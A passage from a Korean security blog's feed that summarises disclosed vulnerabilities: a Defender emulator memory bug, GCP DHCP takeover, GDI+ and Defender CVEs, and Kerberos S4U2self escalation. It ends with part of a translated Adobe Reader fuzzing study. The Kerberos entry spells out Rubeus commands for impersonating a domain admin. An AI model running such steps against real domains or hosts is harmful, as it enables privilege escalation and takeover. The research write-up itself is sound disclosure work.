class="hljs-keyword">sizeof</span>(EMBEDDED_SECTION);<span class="hljs-comment">// ...</span><span class="hljs-keyword">do</span>&#123;  SectHdrs-&gt;VirtualAddress = *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset);  SectHdrs-&gt;PointerToRawData = *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset);  <span class="hljs-comment">//  IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE</span>  SectHdrs-&gt;Characteristics = <span class="hljs-number">0xE0000020</span>;  CurrSect = (EMBEDDED_SECTION *)((<span class="hljs-keyword">char</span> *)<span class="hljs-keyword">this</span>-&gt;FirstSection + Offset);  <span class="hljs-keyword">if</span> ( SectNum &gt;= NumSects )    EndAddress = <span class="hljs-keyword">this</span>-&gt;ImageSize;  <span class="hljs-keyword">else</span>    EndAddress = CurrSect[<span class="hljs-number">1</span>].VirtualAddress;  VirtualSize = EndAddress - CurrSect-&gt;VirtualAddress;  SectHdrs-&gt;Misc.VirtualSize = VirtualSize;  SectHdrs-&gt;SizeOfRawData = VirtualSize;  StringCchPrintfA((<span class="hljs-keyword">char</span> *)SectHdrs, <span class="hljs-number">8u</span>, <span class="hljs-string">&quot;.sect%d&quot;</span>, SectNum);  memcpy_s_0(    &amp;<span class="hljs-keyword">this</span>-&gt;ImagePtr[*(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset)],    <span class="hljs-keyword">this</span>-&gt;ImageSize - *(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;VirtualAddress + Offset),    *(<span class="hljs-keyword">void</span> **)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;PointerToData + Offset),    *(<span class="hljs-keyword">int</span> *)(&amp;<span class="hljs-keyword">this</span>-&gt;FirstSection-&gt;SectSize + Offset));</code></pre><p>위 코드에서는 DLL에 저장된 <code>RVA(Relative Virtual Address)</code>를 아무런 검증 없이 가져옵니다. 그런 다음, 이를 마지막 <code>memcpy</code>에서 버퍼의 오프셋으로 사용하는데, 이 때 임의로 넣은 <code>RVA</code> 값을 통해 원하는 오프셋을 읽거나 쓸 수 있습니다. 익스플로잇이 될 경우, 이 작업은 에뮬레이터에서 진행되기 때문에 에뮬레이터 밖의 메모리를 읽거나 쓸 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>j0ker</tag>
      
      <tag>defender</tag>
      
      <tag>antivirus</tag>
      
      <tag>unpacking</tag>
      
      <tag>arbitrary_read_write</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] GCP VM takeover via DHCP flood attack</title>
    <link href="/2021/07/08/fabu1ous/2021-07-08/"/>
    <url>/2021/07/08/fabu1ous/2021-07-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/gcp-dhcp-takeover-code-exec">gcp-dhcp-takeover-code-exec</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google’s Comput Engine Platform</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p><strong>아직 패치되지 않은 취약점입니다.</strong></p><p>ISC DHCP가 사용하는 랜덤 로직에서 취약점이 발견되었습니다. 해커는 이를 악용해 자신을 Metadata server로 가장하고 Google Cloud Platform(GCP)의 가상 머신(VM: Virtual Machine)을 장악할 수 있습니다.</p><p>ISC DHCP 클라이언트는 random() 함수를 통해 유사 난수를 생성합니다. 난수의 seed는 다음과 같은 3가지 값을 조합해 사용하는데, 유효한 범위 내에서 XID 예측이 가능해 dhcilent에 DHCP packet을 보낼 수 있습니다.</p><ul><li>프로세스가 시작된 시점의 unixtime</li><li>dhclient 프로세스의 pid</li><li>네트워크 인터페이스 카드 이더넷 주소(MAC)의 마지막 4 byte</li></ul><p>GCP VM은 ssh 공개키 분배와 같은 초기 설정 작업을 Metadata server에 크게 의존합니다. XID을 유추한 해커는 VM이 네트워크를 재설정하도록 유도할 수 있고 그 과정에서 자신을 Metadata server로 속여 원하는 ssh 공개키를 VM에 전달할 수 있습니다. 이후 해커는 ssh를 통해 원격 쉘에 자유자재로 접근할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>gcp</tag>
      
      <tag>dhcp</tag>
      
      <tag>random</tag>
      
      <tag>network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1665: Windows 그래픽 드라이버 원격 코드 실행 취약점</title>
    <link href="/2021/07/06/l0ch/2021-07-06/"/>
    <url>/2021/07/06/l0ch/2021-07-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/analyzing-cve-2021-1665-remote-code-execution-vulnerability-in-windows-gdi/">Analyzing CVE-2021-1665 – Remote Code Execution Vulnerability in Windows GDI+</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows의 그래픽 장치 인터페이스(Graphic Device Interface, GDI)에서 발견된 원격 코드 실행 취약점의 세부 정보가 공개되었습니다.</p><p>취약점은 <code>gdiplus.dll</code> 에서 EMF 파일을 파싱 할 때 발생합니다.</p><blockquote><p>EMF : WMF 파일의 확장으로 응용프로그램에서 이미지 또는 그래픽을 렌더링 할 수 있도록 하는 메타 파일</p></blockquote><p><code>Builtline::BuildAllLines</code> 함수에는 다음 루프 프로세스가 존재합니다.</p><ol><li><code>0x60</code> bytes 크기의 메모리를 할당</li><li><code>Builtline::BuiltLine</code>를 호출해 할당된 메모리에 데이터 복사</li><li><code>BuiltLine::GetUntrimmedCharacterCount</code> 함수를 호출하고 해당 함수의 반환 값(1)을 루프 카운터 더함</li><li>루프 카운터가 EMF 파일의 <code>Length</code> 필드보다 크면 루프 종료</li></ol><p>그러나 <code>BuiltLine::GetUntrimmedCharacterCount</code> 함수의 반환 값이 0이 되는 경우를 처리하는 코드가 없어 지정된 <code>Length</code> 필드 값 이상으로 루프가 실행되고 이는 데이터 손상과 원격 코드 실행으로 이어질 수 있습니다.</p><p>Microsoft는 <code>BuiltLine::GetUntrimmedCharacterCount</code> 함수의 반환 값을 확인하는 검사를 추가한 패치를 배포하였습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>microsoft</tag>
      
      <tag>L0ch</tag>
      
      <tag>gdi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Abusing Kerberos S4U2self local privilege escalation</title>
    <link href="/2021/07/05/idioth/2021-07-05/"/>
    <url>/2021/07/05/idioth/2021-07-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/">Abusing Kerberos S4U2self for local privilege escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Kerberos S4U2self</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>티켓을 기반으로 동작하는 컴퓨터 네트워크 인증 암호화 프로토콜 Kerberos의 <a href="http://www.harmj0y.net/blog/activedirectory/S4U2pwnage/">S4U2self extension을 악용</a>하여 권한 상승이 가능합니다. 해당 기술은 새로 발견된 것은 아니며 <a href="https://github.com/GhostPack/Rubeus#constrained-delegation-abuse">Rubeus manual</a>과 <a href="https://exploit.ph/revisiting-delegate-2-thyself.html">Charlie Clark의 게시글</a>에서 상세 내용을 확인할 수 있습니다.</p><p>S4U2proxy와 관련된 시스템 간에 작업은 권한을 가진 계정이 활성화 되어 있어야 하지만, SPN을 사용하는 모든 사용자는 S4U2self를 호출할 수 있습니다. Active Directory에서 네트워크 서비스 계정과 AppPool identities는 컴퓨터 계정의 역할을 할 수 있습니다. 따라서 네트워크 서비스 계정으로 실행되는 MSSQL이나, AppPool을 사용하는 IIS 등이 실행 중일 경우 S4U2self를 호출하여 모든 유저가 자신의 서비스 티켓을 요청할 수 있습니다. 이를 통해 권한 상승을 하는 방법은 다음과 같습니다.</p><ol><li>TGT 가져오기</li></ol><p>S4U2self를 호출하기 위해서는 TGT 또는 컴퓨터 계정의 자격 증명이 필요합니다. 컴퓨터 계정의 TGT는 Rubues의<code>tgt::deleg</code> trick을 통해 가져올 수 있습니다.</p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgtdeleg /nowrap&quot;</span></code></pre><ol start="2"><li>SPN 수정</li></ol><p>위의 TGT를 사용하여 S4U2self를 호출하여 도메인 관리자에 대한 티켓을 요청할 수 있습니다. </p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;s4u /self /nowrap /impersonateuser:doadmin /ticket:base64blob&quot;</span></code></pre><p>기본적으로 S4U2self를 통해 가져온 티켓의 SPN은 해커가 실행 중인  <code>Computername$</code>으로 설정되어 있습니다. 따라서 유효한 SPN이 아니므로 티켓을 사용할 수 없지만, <code>tgssub</code>와 <code>/altservice</code>를 사용하여 해당 부분을 수정할 수 있습니다.</p><pre><code class="hljs cmake">Invoke-Rubeus -<span class="hljs-keyword">Command</span> <span class="hljs-string">&quot;tgssub /altservice:http/adsec-00.contoso.com /ticket:base64blob&quot;</span></code></pre><p>그 후 다른 호스트에서 티켓을 복사해 사용할 수 있습니다.</p><p><img src="https://cyberstoph.org/img/7_tgssub_ptt_2.png" alt="tgtdeleg"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>idioth</tag>
      
      <tag>kerberos</tag>
      
      <tag>s4u2self</tag>
      
      <tag>rubeus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1170 - Microsoft Windows Defender Elevation of Privilege Vulnerability</title>
    <link href="/2021/07/04/j0ker/2021-07-04/"/>
    <url>/2021/07/04/j0ker/2021-07-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://itm4n.github.io/cve-2020-1170-windows-defender-eop/">https://itm4n.github.io/cve-2020-1170-windows-defender-eop/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender는 두 가지 로그 파일, <code>MpCmdRun.log</code>와 <code>MpSigStub.log</code>를 사용하는데 이 둘 모두 <code>C:\Windows\Temp</code>에 저장합니다. 일반 유저 권한에서는 이 두 파일에 대한 Write 권한은 없지만 <code>C:\Windows\Temp</code>에 자유롭게 파일이나 디렉터리를 생성할 수 있습니다.</p><p>두 로그 파일 중 <code>MpCmdRun.log</code> 파일이 16MB보다 커지면, Windows Defender는 SYSTEM 권한으로 해당 파일의 이름을 <code>MpCmdRum.log.bak</code>으로 수정하고 같은 이름의 새로운 파일을 생성합니다. 하지만 <code>MpCmdRun.log.bak</code>이 존재하고 폴더라면, 폴더 안에 있는 파일들과 해당 폴더를 삭제하고 로그 파일을 생성합니다.</p><p>이 취약점을 트리거하기 위해서는 먼저 원하는 <code>MpCmdRun.log.bak</code>이라는 이름으로 삭제하고 싶은 폴더를 가리키는 Junction 폴더를 <code>C:\Windows\Temp</code>에 생성합니다. <code>Update-MpSignature -UpdateSource InternalDefinitionUpdateServer</code> 명령어를 40분 동안 무한반복 실행하여 <code>MpCmdRun.log</code>가 16MB보다 커지게 하면 취약점이 트리거 되어 원하는 폴더 및 그 아래 파일들을 지울 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>microsoft</tag>
      
      <tag>j0ker</tag>
      
      <tag>defender</tag>
      
      <tag>file_deletion</tag>
      
      <tag>directory_deletion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] 50 CVEs in 50 Days: Fuzzing Adobe Reader</title>
    <link href="/2021/07/04/fabu1ous/50cve/"/>
    <url>/2021/07/04/fabu1ous/50cve/</url>
    
    <content type="html"><![CDATA[<h1 id="번역-추신"><a href="#번역-추신" class="headerlink" title="번역 추신"></a>번역 추신</h1><p>WinAFL 연구글을 쓰면서 타겟함수 찾기 위해 분석하는 방식을 좀 더 공부하기 위해 읽은 글입니다. 참 애매한 주제인 게 타겟 분석을 너무 많이하면 퍼징을 하는 의미가 없어지고 그렇다고 분석을 너무 적게 하면 Harness 작성 및 퍼징을 돌리는 거 자체가 번거워집니다. 그 사이 어딘가 적정 선을 찾는 것이 중요한데 이 글이 도움이 될 거라 생각합니다. 이 글을 따라서 직접 실습해보고 재구성한 연구글을 업로드할 생각이었지만 종강 기념으로 놀다 와서 진득하게 연구글을 쓸 시간이 없었습니다. ㅎㅎ 그래서 일단 번역글을 올립니다. 현재 업로드 중인 WinAFL 시리즈의 다음 글은 이번 번역글을 좀 더 깊게 공부해보고 작성하겠습니다.</p><p>원본글 :  <a href="https://research.checkpoint.com/2018/50-adobe-cves-in-50-days/">https://research.checkpoint.com/2018/50-adobe-cves-in-50-days/</a></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>2017년에 큰 변화가 있었습니다. 그 해에 보고된 새로운 취약점의 수는 약 14,000개로, 전년보다 두 배 이상 많습니다. 아마 그 이유는 자동 취약점 탐색 툴인 “퍼저”의 인기가 높아졌기 때문일 겁니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/1.png"></p><p>퍼저 자체는 20년 이상 존재해 왔고 그리 새로운 기술은 아닙니다. 하지만 주목해야 할 사실은 퍼저들이 발전했다는 겁니다. 그들은 더욱 뛰어난 기능과 쉬운 접근성을 가지게 됐으며 무엇보다 완성도가 높아졌습니다. 그럼에도 불구하고, 퍼저를 사용하는 것은 “어두운 예술”이라는 평판을 가지고 있기 때문에 많은 연구자들은 퍼저를 사용하는 것을 꺼려합니다.</p><p>위의 모든 것을 고려해 볼 때, 다음과 같은 질문을 해볼 수 있습니다. “더 많은 연구자들이 더 많은 취약점을 찾기 위해 퍼저를 사용하고 있다. 하지만 <em>모든</em> 연구자들이 <em>모든</em> 취약점을 찾기 위해 퍼저를 사용하고 있을까?” “FUZZ라고 적힌 커다란 버튼을 누르기만 하면 찾을 수 있는, 거저먹을 수 있는 취약점들이 얼마나 있을까?”</p><p>그 답을 알기 위해, 저희는 저희가 생각할 수 있는 가장 흔한 실험을 만들었습니다. 가장 일반적인 Windows 퍼징 프레임워크 중 하나인 WinAFL과 세계에서 가장 인기 있는 소프트웨어 제품 중 하나인 Adobe Reader를 사용했습니다. 저희는 코드를 분석하고, 취약점이 있을 만한 라이브러리를 찾아 harness를 작성하고, 마지막으로 퍼징 등 전체 작업에 50일의 기간을 설정했습니다.</p><p>결과는 매우 충격적이었습니다. 50일 동안 Adobe Reader에서 50개 이상의 새로운 취약점을 발견할 수 있었습니다. 이는 하루 평균 1개의 취약점으로, 이러한 유형의 연구에서는 흔하지 않은 속도입니다.</p><p>이 글을 통해 해당 연구의 전말을 알려드리려 합니다. 검색 범위를 넓히기 위해 사용한 새로운 방법론, WinAFL을 개선한 방법, 그리고 마지막으로 그 과정에서 얻은 지식을 공유하려 합니다.</p><h1 id="What-is-WinAFL"><a href="#What-is-WinAFL" class="headerlink" title="What is WinAFL?"></a>What is WinAFL?</h1><p>AFL은 coverage guided genetic fuzzer로, 실제 프로그램에서 버그를 찾는 데 매우 영리한 휴리스틱을 갖고 있습니다.</p><p>WinAFL은 Windows용 AFL로 Ivan Fratric(Google Project Zero)에 의해 만들어지고 관리되고 있습니다. Closed source 바이너리를 타겟으로 한 여러 instrumentation을 사용합니다.</p><p>우선 AFL이 어떻게 동작하는지 자세하게 적혀있는 AFL 기술 문서를 읽는 것을 추천합니다. 또한 단점을 지적하고 문제가 발생했을 때 디버깅할 수 있도록 도와줍니다.</p><p>WinAFL은 압축 바이너리 형식(이미지, 비디오, 아카이브)의 파일 포맷 버그를 찾는데 매우 효과적입니다.</p><h1 id="Attacking-Acrobat-Reader-DC"><a href="#Attacking-Acrobat-Reader-DC" class="headerlink" title="Attacking Acrobat Reader DC"></a>Attacking Acrobat Reader DC</h1><p>우선 메인 바이너리 AcroRd32.exe부터 시작해 봅시다.  AcroRD32.dll 주변의 (상대적으로) 얇은 wrapper이며 대략 30MB입니다. AcroRD32.dll은 많은 코드가 있습니다. 그중 일부는 PDF 오브젝트에 대한 파서가 포함되어 있고 대부분은 GUI 코드(일반적으로 GUI 코드에선 버그를 찾지 않음)입니다.</p><p>WinAFL은 바이너리 포맷에 효과적이므로 특정 파서를 공격하는데 집중하기로 했습니다. 문제는 파서를 찾아서 파서를 위한 harness를 작성하는 것입니다. Harness란 정확히 무엇인지 잠시 후에 설명하겠습니다.</p><p>전체 Reader 프로세스를 로드하지 않고도 로드할 수 있는 바이너리 포맷의 파서를 찾아야 합니다.</p><p>Acrobat의 폴더에서 DLL을 탐색한 결과 JP2KLib.dll이 이상적인 타겟임을 확인했습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/2.png"></p><p>JP2KLib.dll은 JPEG2000 포맷의 파서로 상당히 유용한 함수를 export 합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/3.png"></p><p>이번 연구의 타겟은 다음과 같습니다.</p><p>Acrobat Reader DC ≤ 2018.011.238</p><p>JP2KLib.dll 1.2.2.39492</p><h1 id="What-is-a-Target-Function"><a href="#What-is-a-Target-Function" class="headerlink" title="What is a Target Function?"></a>What is a Target Function?</h1><p><a href="https://github.com/googleprojectzero/winafl#how-to-select-a-target-function">타겟함수</a>는 WinAFL이 퍼징 프로세스의 엔트리 포인트로 사용된는 함수를 뜻합니다. fuzz_iteration 횟수만큼 반복 호출되며 각 실행마다 input 파일을 뮤테이트합니다.</p><p>타겟 함수는:</p><p>input 파일을 열고, 파일을 읽고, 파일을 파싱 한 후 닫아야 합니다.</p><p>C++ exception 혹은 TermainateProcess를 호출하지 않고 정상적으로 리턴해야 합니다.</p><p>이런 함수를 찾기란 쉽지 않고 따라서 복잡한 소프트웨어가 타겟일 땐 대개 harness를 작성해야 합니다.</p><h1 id="What-is-a-Harness"><a href="#What-is-a-Harness" class="headerlink" title="What is a Harness?"></a>What is a Harness?</h1><p>Harness는 퍼징 하려는 함수를 트리거하는 작은 프로그램입니다. Harness는 타겟 함수를 포함하고 있어야 합니다. 다음은 WinAFL 레포에 포함된 gdiplus에 대한 간단한 예제 harness입니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/4.png"></p><p>main의 첫 argument는 경로입니다. 함수 내에서 퍼징 하려는 API인 Image::Image parser를 다음과 같이 호출합니다. 오류 발생 시 프로세스를 종료하지 않고 마지막에 모든 리소스를 해제합니다.</p><p>이 프로세스는 문서화된 API에서 비교적 쉽습니다. 문서를 사용해 샘플 코드를 복사하거나 간단한 프로그램을 작성할 수 있습니다. 하지만 그러면 너무 쉽죠?</p><p>Closed Source 바이너리인 Adobe Reader를 타겟으로 선택했습니다. 이런 타겟의 Harness 작성법은 다음과 같습니다.</p><ol><li>퍼징 할만한 함수를 찾습니다.</li><li>리버싱을 통해 분석합니다.</li><li>해당 API를 호출하는 프로그램을 작성합니다.</li><li>잘 작동하는 Harness를 만들 때까지 반복합니다.</li></ol><p>다음 섹션에서는 JP2KLib.dll을 리버싱 하고 작동하는 하니스를 작성하는 방법을 자세히 설명합니다. 간략한 방법론에만 관심이 있는 독자들은 다음 섹션으로 건너뛰시길 바랍니다.</p><h1 id="Writing-a-Harness-for-JP2KLib-dll"><a href="#Writing-a-Harness-for-JP2KLib-dll" class="headerlink" title="Writing a Harness for JP2KLib.dll"></a>Writing a Harness for JP2KLib.dll</h1><p>JP2KLib.dll의 리버싱을 시작하기 전에, 먼저 해당 라이브러리가 오픈소스인지 혹은 public 심볼을 갖는지 확인해야합니다. 많은 시간을 절약할 수 있고 생각보다 흔한 일이지만 저희의 경우에는 운이 별로 좋지 않았습니다.</p><p>저희는 Adobe Reader가 JP2KLib를 사용하는 방식과 최대한 유사한 Harness를 작성하고 싶기 때문에 먼저 적절한 PDF파일을 찾아야 했습니다.</p><p>저희는 제품 테스트용 PDF corpus를 많이 가지고 있습니다. 그중 JPEG2000용 PDF 필터인 “/JPXdecode”에 해당하는 가장 간단한 예제를 사용했습니다. 구글링 또는 Abrocat Pro/Phantom PDF를 사용해 testcase를 생성할 수도 있습니다.</p><p>Pro Tip 1: reader에 샌드박스가 있어 debugging/triaging에 성가신 경우가 있으므로 이 기능을 사용하지 않도록 설절할 수 있습니다.</p><p><a href="https://forums.adobe.com/thread/2110951">https://forums.adobe.com/thread/2110951</a></p><p>Pro Tip 2: <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap">PageHeap</a>을 설정하여 할당 위치와 크기를 추적하는 것으로 리버싱 작업을 수월하게 만들 수 있습니다.</p><p>PDF wrapper 없이도 harness에 사용할 수 있도록 샘플 중에서 추출하여 jp2 파일을 추출했습니다. 나중에 harness의 test input으로 사용할 것들입니다.</p><p>작동하는 최소 샘플을 얻었으니 “sxe ld jp2klib”을 사용해 JP2KLib.dll이 로드되는 시점에 브레이크 포인트를 걸어줍니다. 브레이크 포인트가 걸리면 JP2KLib의 모든 export 함수에 브레이크 포인트를 걸어 줍니다. 브레이크 포인트 명령어는 모든 call stack, 인자, 리턴 값을 기록합니다.</p><pre><code class="hljs bash">bm /a jp2klib!* “.<span class="hljs-built_in">echo</span> callstack; k L5; .<span class="hljs-built_in">echo</span> parameters:;  dc esp L8;  .<span class="hljs-built_in">echo</span> <span class="hljs-built_in">return</span> value: ; pt; ”</code></pre><p>샘플 PDF를 로드해 다음과 같은 output을 얻었습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/5.png"></p><p>JP2KLib가 로드된 후 첫 번째로 호출되는 함수는 JP2KLibInitEx입니다. JP2KLibInitEx가 받는 인자를 분석해 봅시다.</p><p><img src="/2021/07/04/fabu1ous/50cve/6.png"></p><p>AcrobRd32.dll의 함수를 가리키는 포인트가 담긴 0x20 크기의 구조체를 인자로 받습니다. 새로운 함수에 도달했다고 바로 분석하려들면 안됩니다. 그 함수가 타겟 코드에서 쓰일지 모르기 때문입니다. 우선 “nopX”(X는 숫자)라는 이름으로 빈 함수 포인터를 구조체에 넣어놓고 Harness의 뼈대를 만들어 봅시다.</p><ol><li>Command line argument로부터 input file을 받는다.</li><li>JP2KLib.dll을 로드한다.</li><li>만들어둔 구조체를 인자로 JP2KLibInitEx를 호출합니다.</li></ol><p><img src="/2021/07/04/fabu1ous/50cve/7.png"></p><p>LOAD_FUNC는 저희가 작성한 매크로입니다. nopX 함수를 설정하는 NOP매크로도 있습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/8.png"></p><p>컴파일하고 sample.jp2와 함께 실행해보면 잘 작동합니다.</p><p>“g”명령어를 통해 다음 함수로 넘어가 봅시다. 다음으로 실행되는 함수는 JP2KGetMemObjEx이고 어떠한 인자도 받지 않습니다. 따라서 호출하고 리턴 값만 저장합시다.</p><p>그다음 함수인 JP2KDecOptCreat 또한 인자를 받지 않습니다. 마찬가지로 호출하고 리턴 값만 저장합니다. 여기서 문제가 발생합니다. JP2KDecOptCreat 내부에서 nop4와 nop7 함수를 호출하는군요. 따라서 각각 구현을 해줘야 합니다.</p><p>이제 nop4가 어떤 동작을 하는지 알아내야 합니다. nop4에 해당하는 실제 함수 AcroRd32!CTJPEGDecoderRelease+0xa992 에 브레이크 포인트를 걸어줍니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/9.png"></p><p>그리고 계속 실행하다보면</p><p><img src="/2021/07/04/fabu1ous/50cve/10.png"></p><p>이곳에 도달합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/11.png"></p><p>즉, nop4는 malloc의 wrapper함수입니다. 저희가 직접 구현한 뒤 nop4와 바꿔줍니다. nop7(memset), nop5(free), nop6(memcpy)에 대해서도 동일한 작업을 해줍니다.</p><p>그다음 함수인 JP2KDecOptInitToDefaults 인자를 받지 않습니다. 호출하고 리턴 값을 저장합니다.</p><p>현재 harness의 모습은 다음과 같습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/12.png"></p><p>다음 함수인 JP2KImageInitDecoderEx는 5개의 인자를 받습니다!</p><p>5개의 인자 중 3개는 JP2KImageCreate, JP2KDecOptCreate, JP2KGetMemObjEx의 리턴 값입니다.</p><p>세 번째 인자는 vtable을 가리키는 포인터입니다. 지금까지 사용한 트릭을 똑같이 반복합니다. nop을 담고 있는 구조체를 인자로 함수를 호출합니다.</p><p>두 번째 인자는 구조체입니다. 함수 포인터를 담고 있지 않기 때문에 상수값 0xbaaddaab를 보내줍니다.</p><p>현재 harness의 모습은 다음과 같습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/13.png"></p><p>harness를 실행해보니 nop10으로 도달했습니다. nop10의 실제 함수에 브레이크 포인트를 걸면 다음과 같은 call stack을 얻을 수 있습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/14.png"></p><p>JP2KCodeStm::IsSeekable를 IDA로 살펴봅시다.</p><p><img src="/2021/07/04/fabu1ous/50cve/15.png"></p><p>JP2KCodeStm의 0x24 오프셋에 이전 단계에 넣어준 vtable이, 0x18 오프셋에 0xbaaddaab 상수값이 있는 것을 Windbg로 확인할 수 있습니다. JP2KCodeStm::IsSeekable은 0xbaaddaab를 인자로 vtable에 있는 함수를 호출합니다.</p><p>각 파서마다 다르겠지만 일반적으로 익숙한 파일 인터페이스(FILE/ifstream)에 존재하는 input stream을 사용합니다. 일종의 input stream(network/file/memory) 추상화입니다. 저희는 JP2KCodeStm의 동작을 보고 바로 알아차렸습니다.</p><p>0xbaaddaab는 스트림 오브젝트이고 vtable은 그 스트림 오브젝트에 대한 함수들입니다. IDA로 돌아가 JP2KCodeStm::XXX 함수들을 확인해 봅시다.</p><p><img src="/2021/07/04/fabu1ous/50cve/16.png"></p><p>대부분 유사한 방식을 사용하기 때문에 직접 파일 오브젝트를 만들고 필요한 메소드를 구현해봤습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/17.png"></p><p>오류가 나면 버리고 아니라면 JP2KImageInitDecoderEx의 리턴 값을 검사하도록 만들었습니다. JP2KImageInitDecoderEx은 성공 시 0을 리턴합니다. 스트림 함수를 구현하는데 몇 번의 시행착오가 있었지만 원하던 리턴 값을 얻는 데 성공했습니다.</p><p>다음 함수인 JP2KImageDataCreate는 인자를 받지 않으며 리턴 값을 그다음 함수인 JP2KImageGetMaxRes에 전달합니다. 호출하고 넘어갑니다.</p><p>다음은 7개의 인자를 받는 JP2KImageDecodeTileInterleaved 함수입니다. 7개의 인자 중 3개는 JP2KImageCreate, JP2KImageGetMaxRes, JP2KImageDataCreate의 리턴 값입니다.</p><p>IDA로 확인해본 결과 두 번째 그리고 6번째 인자는 NULL입니다.</p><p>네 번째, 다섯 번째 인자는 color depth와 관련된 인자로 저희는 이 두 값이 고정된 체로 퍼징을 하기로 결정했습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/18.png"></p><p>최종적으로 JP2KImageDataDestroy, JP2KImageDestroy, JP2KDecOptDestroy 함수들을 호출해 저희가 만든 오프젝트들을 해제해 memory leak을 방지합니다. 이 작업은 WinAFL로 fuzz_iterations가 높은 작업을 할 때 중요합니다.</p><p>자 이제 잘 작동하는 Harness를 완성했습니다!</p><p>아주 사소한 수정을 해줍니다. JP2KLib을 로드하고 필요한 함수를 받아오는 초기화 작업을 분리합니다. 매 실행마다 초기화 작업을 다시 해 줄 필요가 없으니 이를 분리해줌으로써 실행 속도를 향상할 수 있습니다. 새로운 함수에 fuzzme라는 이름을 지어주고 export 해줍니다. 유효한 오프셋을 구하는 것보다 export 하는 것이 훨씬 쉽습니다.</p><h1 id="Fuzzing-Methodology"><a href="#Fuzzing-Methodology" class="headerlink" title="Fuzzing Methodology"></a>Fuzzing Methodology</h1><ol><li>Basic tests for the harness<ol><li>Stability</li><li>Paths</li><li>Timeouts</li></ol></li><li>Fuzzing Setup</li><li>Initial corpus</li><li>Initial line coverage</li><li>Fuzzing loop<ol><li>Fuzz</li><li>Check coverage / crashes</li><li>cmin &amp; repeat</li></ol></li><li>Triage</li></ol><h1 id="Basic-Tests-for-the-Harness"><a href="#Basic-Tests-for-the-Harness" class="headerlink" title="Basic Tests for the Harness"></a>Basic Tests for the Harness</h1><p>퍼징을 시작하기 앞서 몇 가지 sanity test를 해야 합니다. 그저 서버실 온도만 높이는 일이 발생할 수 있으니. 첫 번째로 확인해야 할 것은 퍼저가 새로운 실행 path에 